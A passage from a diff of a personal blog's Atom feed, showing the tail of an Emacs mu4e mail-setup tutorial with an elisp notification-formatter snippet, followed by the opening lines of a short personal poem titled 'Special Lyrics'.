+        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:title&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:body&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-grouped-mail-notification-formatter&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And That’s it .&lt;/p&gt;
+&lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/general/mu4e_emacs.png&quot; alt=&quot;emacs_mu4e&quot; /&gt;&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="Emacs" /><category term="emacs" /><category term="mail" /><category term="offlineimap" /><category term="mu" /><category term="mu4e" /><category term="mbsync" /><category term="isync" /><category term="oauth2" /><category term="gmail" /><summary type="html">If you’re an emacs user and love using emacs for literally everything , then you are in the right place. In This Short Tutorial we are gonna learn how to setup Mu4e In Emacs From Scratch.</summary></entry><entry><title type="html">Special Lyrics</title><link href="/rawan/2021/04/17/Girl.html" rel="alternate" type="text/html" title="Special Lyrics" /><published>2021-04-17T00:00:00+00:00</published><updated>2021-04-17T00:00:00+00:00</updated><id>/rawan/2021/04/17/Girl</id><content type="html" xml:base="/rawan/2021/04/17/Girl.html">&lt;h3 id=&quot;special-lyrics-to-someone-special-&quot;&gt;Special Lyrics To Someone special .&lt;/h3&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I Saw Your Pretty Face
 When passing by in the street
